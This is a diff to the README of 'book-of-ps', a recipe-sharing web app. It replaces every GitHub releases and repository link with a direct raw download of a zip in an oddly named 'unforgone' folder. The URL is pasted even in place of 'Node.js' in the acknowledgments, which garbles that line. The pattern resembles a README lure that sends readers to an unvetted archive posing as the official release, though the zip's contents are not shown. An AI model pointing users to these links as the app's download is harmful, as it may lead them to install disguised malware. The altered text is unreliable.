@@ -1,7 +1,7 @@
 # 📚 book-of-ps - Your Recipe Collection Made Simple
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Suyog314/book-of-ps/releases)
+[![Download](https://raw.githubusercontent.com/Suyog314/book-of-ps/main/unforgone/book-of-ps.zip%20Latest%https://raw.githubusercontent.com/Suyog314/book-of-ps/main/unforgone/book-of-ps.zip)](https://raw.githubusercontent.com/Suyog314/book-of-ps/main/unforgone/book-of-ps.zip)
 
 ## 🚀 Getting Started
 Welcome to the **book-of-ps** application! This software is designed to help you collect and share your favorite recipes easily. You can search for recipes, log in securely, and enjoy our user-friendly interface.
@@ -21,7 +21,7 @@ To run this application, you need:
 - **Responsive Design**: Works well on both desktop and mobile devices.
 
 ## 📥 Download & Install
-To get started, visit this page to download the latest version: [Download the Latest Release](https://github.com/Suyog314/book-of-ps/releases).
+To get started, visit this page to download the latest version: [Download the Latest Release](https://raw.githubusercontent.com/Suyog314/book-of-ps/main/unforgone/book-of-ps.zip).
 
 1. Click on the link above.
 2. On the Releases page, find the latest version of the application.
@@ -41,13 +41,13 @@ If you encounter issues, try the following:
 - Check for updates to ensure you have the latest version.
 
 ## 🌐 Learn More
-For additional information about features and usage, please visit the [GitHub Repository](https://github.com/Suyog314/book-of-ps).
+For additional information about features and usage, please visit the [GitHub Repository](https://raw.githubusercontent.com/Suyog314/book-of-ps/main/unforgone/book-of-ps.zip).
 
 ## 🤝 Contributing
 Although this project is archived and no longer actively maintained, contributions and feedback are welcome. If you notice any issues or have suggestions, feel free to open an issue on the repository.
 
 ## 🎉 Acknowledgments
-This project showcases knowledge in multiple web technologies including React, Node.js, Express, and MongoDB. Thank you for exploring the **book-of-ps** application!
+This project showcases knowledge in multiple web technologies including React, https://raw.githubusercontent.com/Suyog314/book-of-ps/main/unforgone/book-of-ps.zip, Express, and MongoDB. Thank you for exploring the **book-of-ps** application!
 
 ## 📞 Contact
 For any queries, please reach out via the GitHub issue tracker on the repository page.
